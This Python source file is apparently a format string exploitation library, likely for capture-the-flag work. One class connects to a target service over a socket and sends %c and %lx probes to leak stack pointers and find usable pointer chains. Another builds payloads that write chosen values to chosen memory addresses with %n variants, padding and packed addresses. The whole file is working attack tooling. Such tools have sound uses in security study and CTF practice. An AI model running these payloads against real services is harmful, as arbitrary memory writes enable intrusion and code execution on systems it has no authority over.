#!/usr/bin/env python3
import struct
import socket
from functools import partial
from pwnutils import recv_until

class fmtstr_rel:
    addrlen = 0
    leaklen = 0
    is_ptr = None
    mod = ''
    wr = b''
    lk = b''

    def __init__(self, addrlen):
        self.addrlen = addrlen
        self.leaklen = addrlen * 2
        self.is_ptr = self.is_ptr64 if addrlen == 8 else self.is_ptr32
        self.mod = '<Q' if addrlen == 8 else '<I'
        self.wr = b"%ln" if addrlen == 8 else b"%n"
        self.lk = b"lx" if addrlen == 8 else b"x" 
    
    def is_ptr64(self, val):
        return (val >> 44) >= 0x5 and (val >> 44) <= 0x7

    def is_ptr32(self, ptr):
        raise Exception("not supported yet")

    def get_ptr_idx(self, tar, off, pwn):
        num = 0
        while True:
            val = 0
            try:
                with socket.socket() as s:
                    s.connect(tar)
                    skip_num = off // self.addrlen
                    tst = b"%c" * (skip_num + num)
                    tst += b"%0" + str(self.leaklen).encode() + self.lk
                    st = pwn(s, tst, skip_num + num + self.leaklen)
                    val = int(st[skip_num + num:][:self.leaklen], 16)
            except Exception as e:
                break
            if self.is_ptr(val):
                yield num
            num += 1

    def check_ptr(self, tar, off, pwn, ptrs):
        leakstr1 = b"$0" + str(self.leaklen).encode() + self.lk + b"%"
        leakstr2 = b"$-" + str(self.addrlen).encode() + b"." + str(self.addrlen).encode() + b"s"
        inp = b"".join([b"%" + x + leakstr1 + x + leakstr2 for x in [str(off // 8 + i + 1).encode() for i in ptrs]])
        res = b""
        esize = self.leaklen + self.addrlen
        with socket.socket() as s:
            s.connect(tar)
            res = pwn(s, inp, len(ptrs) * (esize))
        if len(res) != esize * len(ptrs):
            return None
        ret = []
        for i in range(len(ptrs)):
            addr = int(res[esize * i:][:self.leaklen].decode(), 16)
            val = struct.unpack(self.mod, res[esize * i + self.leaklen:][:self.addrlen].rstrip(b" ").ljust(self.addrlen, b"\x00"))[0]
            ret.append((ptrs[i], addr, val))
        return ret

    def find_pos_chains(self, tar, off, pwn):
        pos = list(self.get_ptr_idx(tar, off, pwn)) 
        ptr = self.check_ptr(tar, off, pwn, pos)
        reachable = dict([(x[1], x[0]) for x in ptr])
        return [(x[0], reachable[x[2]]) for x in filter(lambda z: z[2] in reachable, ptr)]

    def check_chain(self, tar, off, pwn, chain):
        skip = off // self.addrlen
        slide = skip + chain[0]
        inp = b"%c" * (slide)
        inp += self.wr
        inp += b"%" + str(skip + chain[1] + 1).encode() + b"$0" + str(self.leaklen).encode() + self.lk
        res = b""
        try:
            with socket.socket() as s:
                s.connect(tar)
                res = pwn(s, inp, slide + 32)
            return int(res[slide:][:16].decode(), 16) == slide
        except:
            pass
        return False

    def get_chains(self, tar, off, pwn):
        return list(filter(partial(self.check_chain, tar, off, pwn), self.find_pos_chains(tar, off, pwn)))


class fmtstr:
    """Class building formatstring exploits

    This class can be used to build format Strings.
    It supports 32 and 64 bit address widths. The number
    of bytes to be written at a time can be adjusted and
    the overwrites will be split and reordered to reduce the
    output size of the printed format string.
    """

    def __init__(self, addrlen = 8):
        self.addrlen = addrlen

    def split(self, fmt, mlen):
        """splits the arguments into 1,2,4 or 8 bytes written at a time

        This function takes leading zeros into account and includes
        their write into the write of the lower values
        """

        pos, l, dat = fmt
        if mlen not in [1,2,4,8]:
            raise "error"
        if l not in [1,2,4,8]:
            nl = list(filter(lambda x: x < l, [1,2,4,8]))[-1]
            p1 = self.split((pos, nl, dat & (2 ** (nl * 8) - 1)), mlen)
            p2 = self.split((pos + nl, l - nl, dat >> (nl * 8)), mlen)
            return p1 + p2
        if l == 1 or l <= mlen:
            return [fmt]
        if (dat >> (mlen * 8)) & (2 ** (mlen * 8) - 1) == 0:
            return [fmt]
        return self.split((pos, l // 2, dat & (2 ** (l * 4) - 1)), mlen) + self.split((pos + l // 2, l // 2, dat >> (l * 4)), mlen)

    def fmt(self, ind, l):
        """picks the right length modifier"""

        ret = "%" + str(ind) + "$"
        if l == 1:
            ret += "hh"
        if l == 2:
            ret += "h"
        if l == 8:
            ret += "ll"
        return ret + "n"

    def fill(self, l, pos = 0, pad = None):
        """creates appropriate padding

        takes requested placement of padding into account
        and uses static strings for padding length <= 3 as
        the string is at most as long
        """

        if pad == None:
            if l < 3:
                return "A" * l
            else:
                return "%" + str(l) + "c"
        pp, pc = pad
        el = len(pc)
        #print(str(pos) + ": " + str(pc))
        if pos < pp:
            le = min([l, pp - pos])
            ret = self.fill(le)
            if le != l:
                ret += self.fill(l - le, pos + le, pad)
            return ret
        if pos >= pp + el:
            return self.fill(l)
        le = min([el - (pos - pp), l])
        ret = "".join(pc[pos - pp: pos - pp + le])
        if le != l:
            ret += self.fill(l - le)
        return ret

    def sanitize(self, fmt):
        """restricts the value to the number of bytes written"""

        addr, l, dat = fmt
        return (addr, l, dat & (2 ** (l * 8) - 1))

    def prittyprint(self, fmt):
        for addr, l, val in fmt:
            print(hex(addr) + "[:"+str(l) + "] := " + hex(val))

    def format(self, stuff, mlen, st, extra, pad, debug = False):
        """creates the formantstring

        Parameters
        ----------
        stuff : List[Tuple[int, int, int]]
            A list of tuples (target, length, value)
        mlen : int
            Number of Bytes written at a time
        st : int
            the index corresponding to the first bytes of the formatstring
            aka, if the first element would be an injected address, this
            parameter is the index that would be used for indexed addressing
        extra : List[Tuple[int, str]]
            additional stuff added to the formatstring (like %s), backed by an address
        pad : (int, str)
            specific text to be placed in the output of the format string

        Returns
        -------
        bytes
            the formatstring
        """

        pwn = ""
        arg_st = st
        if debug:
            self.prittyprint(stuff)
        stuff = map(self.sanitize, stuff)
        fmts = sorted(sum(map(lambda x: self.split(x, mlen), stuff), []), key=lambda x: x[2])
        if debug:
            print("broken down:")
            self.prittyprint(fmts)
        while True:
            _, l, wt = fmts[0]
            j = 0
            pwn = self.fill(wt, j, pad)
            j += wt
            pwn += self.fmt(arg_st, l)
            for i in range(1, len(fmts)):
                diff = fmts[i][2] - fmts[i - 1][2]
                pwn += self.fill(diff, j, pad)
                j += diff
                pwn += self.fmt(arg_st + i, fmts[i][1])
            for i in range(0, len(extra)):
                pwn += "%" + str(arg_st + i + len(fmts)) + "$" + extra[i][1]
            if (len(pwn) + self.addrlen - 1) // self.addrlen <= (arg_st - st):
                break
            arg_st += 1
        pwn = pwn.encode().ljust((arg_st - st) * self.addrlen, b"\0")
        letter = 'Q'
        if self.addrlen == 4:
            letter = 'I'
        pwn += struct.pack('<' + letter * (len(fmts) + len(extra)), *list(map(lambda x:x[0], fmts + extra)))
        #print(pwn)
        return pwn
